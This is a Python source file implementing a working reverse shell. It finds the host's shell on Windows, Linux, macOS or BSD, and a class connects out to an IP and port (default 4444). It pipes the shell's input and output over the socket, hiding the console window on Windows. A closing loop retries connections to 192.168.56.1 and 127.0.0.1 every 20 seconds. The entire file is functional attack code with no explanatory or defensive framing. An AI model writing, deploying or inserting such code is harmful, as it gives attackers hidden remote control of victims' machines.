import os
import socket
import subprocess
import threading
import random
import http.client
import time
import platform

def get_os_type():
    """Get normalized OS type"""
    system = platform.system().lower()
    
    os_mapping = {
        'windows': 'windows',
        'linux': 'linux', 
        'darwin': 'darwin',  # macOS
        'openbsd': 'openbsd',
        'freebsd': 'freebsd'
    }
    
    return os_mapping.get(system, 'unknown')

def find_shell(target_platform: str = "") -> str:
    """Find available shell for the platform"""
    
    current_os = target_platform or get_os_type()
    
    shell_preferences = {
        'windows': [
            os.path.join(os.environ.get('SYSTEMROOT', 'C:\\Windows'), 'System32', 'cmd.exe'),
            'cmd.exe'  # Fallback to PATH
        ],
        'linux': ['/bin/zsh', '/bin/bash', '/bin/dash', '/bin/sh'],
        'darwin': ['/bin/zsh', '/bin/bash', '/bin/sh'],
        'openbsd': ['/bin/zsh', '/bin/ksh', '/bin/sh']
    }
    
    if current_os not in shell_preferences:
        raise ValueError(f"Unsupported OS: {current_os}")
    
    # Check user's preferred shell first (Unix-like)
    if current_os != 'windows':
        user_shell = os.environ.get('SHELL')
        if user_shell and os.path.isfile(user_shell) and os.access(user_shell, os.X_OK):
            return user_shell
    
    # Try shells in order of preference
    for shell in shell_preferences[current_os]:
        if os.path.isfile(shell) and os.access(shell, os.X_OK):
            return shell
    
    raise RuntimeError(f"No suitable shell found for {current_os}")


class CallShell:
    def __init__(self, ippassedPassed, portpassedPassed: str=4444, opsysPassed: str=""):
        self.strIP = ippassedPassed
        self.intPort = portpassedPassed
        self.strOpSys = opsysPassed

    def receive_output(self, object_socket_passed, object_popenPassed):
        try:
            while True:
                objData = object_socket_passed.recv(1024)
                if not objData:
                    break  # Connection closed
                object_popenPassed.stdin.write(objData)
                object_popenPassed.stdin.flush()
        except Exception as e:
            print(f"[!] receive_output error: {e}")
        finally:
            object_socket_passed.close()

    def send_input(self, object_socket_passed, object_popenPassed):
        try:
            while True:
                data = object_popenPassed.stdout.read(1)
                if not data:
                    break
                object_socket_passed.send(data)
        except Exception as e:
            print(f"[!] send_input error: {e}")
        finally:
            object_socket_passed.close()


    def run_thread(self, strStage: str="receive"):
        if "receive" == strStage: 
            object_thread = threading.Thread(target=self.receive_output, args=self.listArgs)
        elif "send" == strStage:
            object_thread = threading.Thread(target=self.send_input, args=self.listArgs)
        object_thread.daemon = True
        object_thread.start()
    def monitor_connection(self, sock, proc):
        """Monitors the connection, and kills the shell if the socket dies"""
        try:
            while True:
                time.sleep(1)
                # Check if process has exited
                if proc.poll() is not None:
                    print("[*] Shell process exited (monitor)")
                    break

                # Check socket connection (dummy send)
                try:
                    sock.send(b'\x00')  # harmless ping
                except socket.error as e:
                    print(f"[!] Socket appears dead: {e}")
                    break

        finally:
            try:
                proc.kill()
            except: pass
            try:
                sock.close()
            except: pass

    def start_shell(self):
        try:
            object_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            object_socket.connect((self.strIP, self.intPort))
            shell_string = find_shell(self.strOpSys)
            print(f"[+] Launching shell: {shell_string}")

            if "/" in shell_string:
                object_popen = subprocess.Popen(
                    [shell_string],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    stdin=subprocess.PIPE
                )
            else:
                object_popen = subprocess.Popen(
                    [shell_string],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    stdin=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )

            self.listArgs = [object_socket, object_popen]
            self.run_thread("receive")
            self.run_thread("send")

            # Add monitor thread to catch broken connections
            threading.Thread(
                target=self.monitor_connection, 
                args=(object_socket, object_popen), 
                daemon=True
            ).start()

            # Wait until process ends (naturally or via monitor)
            while object_popen.poll() is None:
                time.sleep(0.5)

        except Exception as e:
            print(f"[!] start_shell exception: {e}")
        finally:
            try:
                object_popen.kill()
            except: pass
            try:
                object_socket.close()
            except: pass


while True:
    try:
        print("[*] Attempting shell to 192.168.56.1...")
        CallShell("192.168.56.1", 4444).start_shell()
    except Exception as e:
        print(f"[!] Shell to 192.168.56.1 failed: {e}")
    try:
        print("[*] Attempting shell to 127.0.0.1...")
        CallShell("127.0.0.1", 4444).start_shell()
    except Exception as e:
        print(f"[!] Shell to 127.0.0.1 failed: {e}")

    print("[*] Sleeping before retry...")
    time.sleep(20)

